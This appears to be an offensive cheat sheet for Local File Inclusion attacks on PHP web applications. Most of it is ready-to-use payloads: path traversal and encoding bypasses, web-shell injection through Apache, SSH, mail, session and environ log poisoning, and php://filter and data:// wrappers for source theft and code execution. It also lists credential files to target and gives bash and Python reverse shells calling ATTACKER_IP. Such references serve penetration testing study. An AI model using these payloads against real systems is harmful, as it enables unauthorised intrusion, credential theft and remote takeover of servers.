# Local File Inclusion (LFI)

Local File Inclusion vulnerabilities allow attackers to include and execute local files on the target system. LFI can lead to source code disclosure, log poisoning attacks, and remote code execution.

---

## Common Vulnerable Parameters

```
?file=
?page=
?include=
?template=
?doc=
?path=
?folder=
?root=
?pg=
?style=
?pdf=
?module=
?lang=
```

---

## Basic LFI Payloads

```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
/etc/passwd
C:\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

---

## Path Traversal Techniques

### Linux Targets

```bash
# Standard traversal
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/version
../../../proc/cmdline

# Absolute paths
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ

# Null byte injection (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

### Windows Targets

```cmd
# Standard traversal
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini
..\..\..\windows\system.ini

# Absolute paths
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\xampp\apache\logs\access.log
C:\inetpub\logs\LogFiles\W3SVC1\

# URL-encoded backslash
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

---

## Filter Bypass Techniques

### Encoding Bypasses

```
# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# 16-bit Unicode encoding
..%u002F..%u002F..%u002Fetc%u002Fpasswd
```

### Path Manipulation

```
# Dot truncation
../../../etc/passwd.............
../../../etc/passwd%20%20%20%20

# Case variation (Windows)
..\..\..\WiNdOwS\sYsTeM32\dRiVeRs\eTc\HoStS

# Mixed separators
..\/..\/..\/etc\/passwd
..\/..\/..\etc\passwd
```

### Filter Keyword Bypass

```
# If "../" is filtered
....//....//....//etc/passwd
...\....\....\etc\passwd

# If "etc" is filtered
/e?c/passwd
/et[c]/passwd

# If "passwd" is filtered
/etc/pass??
/etc/pass*
```

---

## Log Poisoning Attacks

### Apache Log Poisoning

```bash
# Target log files
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Poison User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/

# Poison Referer
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://TARGET/

# Execute via LFI
http://TARGET/page.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

### SSH Log Poisoning

```bash
# Target log files
/var/log/auth.log
/var/log/secure

# Poison SSH login attempt
ssh '<?php system($_GET["cmd"]); ?>'@TARGET

# Execute via LFI
http://TARGET/page.php?file=../../../var/log/auth.log&cmd=whoami
```

### Mail Log Poisoning

```bash
# Target log files
/var/log/mail.log
/var/log/maillog

# Poison via SMTP
telnet TARGET 25
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: user@TARGET
DATA
Test
.
QUIT

# Execute via LFI
http://TARGET/page.php?file=../../../var/log/mail.log&cmd=ls
```

---

## PHP Wrappers

### php://filter (Source Code Extraction)

```
# Basic source code extraction
php://filter/resource=admin.php
php://filter/resource=/etc/passwd

# Base64 encoded extraction
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../../etc/passwd

# ROT13 encoded extraction
php://filter/read=string.rot13/resource=admin.php

# Chained filters
php://filter/convert.iconv.utf8.utf16/resource=admin.php
php://filter/read=string.toupper|string.rot13/resource=admin.php
php://filter/convert.base64-encode|convert.base64-decode/resource=config.php
```

**Extraction Workflow:**

```bash
# Step 1: Extract encoded source
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=config.php"

# Step 2: Decode base64 output
echo "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==" | base64 -d
```

**php://filter requirements:** Always available in PHP, no special configuration needed.

### data:// Wrapper (RCE)

```
# Basic PHP execution
data://text/plain,<?php echo system('whoami');?>
data://text/plain,<?php phpinfo();?>

# URL encoded payloads
data://text/plain,<?php%20echo%20system('ls');?>
data://text/plain,<?php%20echo%20system($_GET['cmd']);?>
```

**Base64 encoded execution:**

```bash
# Encode payload
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
# Result: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

# Execute via data wrapper
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami
```

**data:// wrapper requirements:**

```
allow_url_include = On
allow_url_fopen = On
```

### Advanced Wrapper Techniques

```
# Multiple encoding bypass
php://filter/convert.base64-encode/convert.base64-encode/resource=admin.php
php://filter/string.rot13|convert.base64-encode/resource=config.php

# Compression filters
php://filter/zlib.deflate/resource=admin.php
php://filter/bzip2.compress/resource=config.php

# WAF evasion via case variation
PHP://filter/resource=admin.php
Php://Filter/Resource=admin.php
```

---

## Session File Poisoning

```
# PHP session file locations
/tmp/sess_[SESSION_ID]
/var/lib/php/sessions/sess_[SESSION_ID]
/var/lib/php5/sessions/sess_[SESSION_ID]

# Poison session data
POST /login.php
username=<?php system($_GET['cmd']); ?>&password=test

# Include session file
http://TARGET/page.php?file=../../../tmp/sess_abc123&cmd=whoami
```

---

## Upload + LFI Combination

```
# Upload malicious file with allowed extension
POST /upload.php (upload shell.jpg containing PHP code)

# Include uploaded file via LFI
http://TARGET/page.php?file=../uploads/shell.jpg&cmd=id
```

---

## Environment Variable Poisoning

```bash
# Target files
/proc/self/environ
/proc/[PID]/environ

# Poison User-Agent in environ
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/

# Include environ file
http://TARGET/page.php?file=../../../proc/self/environ&cmd=whoami
```

---

## High-Value Target Files

### Linux Configuration Files

```bash
# System files
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/crontab
/etc/fstab

# Application configs
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/etc/ssh/sshd_config

# Web application files
/var/www/html/config.php
/var/www/html/.env
```

### Windows Configuration Files

```cmd
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\xampp\apache\conf\httpd.conf
C:\inetpub\wwwroot\web.config
C:\Program Files\MySQL\my.ini
C:\inetpub\logs\LogFiles\W3SVC1\
```

---

## Reverse Shell via Wrappers

```bash
# Create reverse shell payload
echo -n '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''");?>' | base64

# Execute via data wrapper
data://text/plain;base64,<BASE64_PAYLOAD>

# Start listener
nc -lvnp 4444
```

---

## Automated Discovery

### Wfuzz LFI Testing

```bash
# Parameter discovery
wfuzz -c -w params.txt --hh 0 "http://TARGET/page.php?FUZZ=../../../etc/passwd"

# Path traversal fuzzing
wfuzz -c -w lfi_payloads.txt --hh 0 "http://TARGET/page.php?file=FUZZ"
```

---

## Reverse Shell Payloads

### Bash

```bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

### Python

```python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept and modify LFI payloads |
| curl | Manual LFI testing and log poisoning |
| Netcat | Reverse shell listeners |
| Wfuzz | Automated LFI parameter discovery |
| LFISuite | Automated LFI exploitation framework |
| Kadimus | Advanced LFI exploitation tool |
